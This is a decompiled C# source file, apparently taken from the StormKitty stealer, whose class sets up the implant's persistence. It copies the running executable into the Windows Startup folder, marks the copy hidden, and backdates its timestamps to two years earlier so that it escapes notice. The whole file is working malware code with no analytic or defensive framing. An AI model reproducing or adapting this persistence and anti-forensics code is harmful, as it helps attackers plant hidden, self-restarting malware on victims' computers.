﻿using System;
using System.IO;
using System.Reflection;

namespace StormKitty.Implant
{
	// Token: 0x02000070 RID: 112
	internal sealed class Startup
	{
		// Token: 0x060001BA RID: 442 RVA: 0x0000D854 File Offset: 0x0000BA54
		public static void SetFileCreationDate(string path = null)
		{
			string path2 = path ?? Startup.ExecutablePath;
			DateTime dateTime = new DateTime(DateTime.Now.Year - 2, 5, 22, 3, 16, 28);
			File.SetCreationTime(path2, dateTime);
			File.SetLastWriteTime(path2, dateTime);
			File.SetLastAccessTime(path2, dateTime);
		}

		// Token: 0x060001BB RID: 443 RVA: 0x0000D8A0 File Offset: 0x0000BAA0
		public static void HideFile(string path = null)
		{
			string fileName = path ?? Startup.ExecutablePath;
			new FileInfo(fileName).Attributes |= FileAttributes.Hidden;
		}

		// Token: 0x060001BC RID: 444 RVA: 0x0000D8CB File Offset: 0x0000BACB
		public static bool IsInstalled()
		{
			return File.Exists(Startup.StartupDirectory + "\\" + Path.GetFileName(Startup.ExecutablePath));
		}

		// Token: 0x060001BD RID: 445 RVA: 0x0000D8EB File Offset: 0x0000BAEB
		public static void Install()
		{
			File.Copy(Startup.ExecutablePath, Startup.CopyExecutableTo);
			Startup.HideFile(Startup.CopyExecutableTo);
			Startup.SetFileCreationDate(Startup.CopyExecutableTo);
		}

		// Token: 0x060001BE RID: 446 RVA: 0x0000D910 File Offset: 0x0000BB10
		public static bool IsFromStartup()
		{
			return Startup.ExecutablePath.StartsWith(Startup.StartupDirectory);
		}

		// Token: 0x04000100 RID: 256
		private static readonly string StartupDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

		// Token: 0x04000101 RID: 257
		public static readonly string ExecutablePath = Assembly.GetEntryAssembly().Location;

		// Token: 0x04000102 RID: 258
		private static readonly string CopyExecutableTo = Startup.StartupDirectory + "\\" + Path.GetFileName(Startup.ExecutablePath);
	}
}
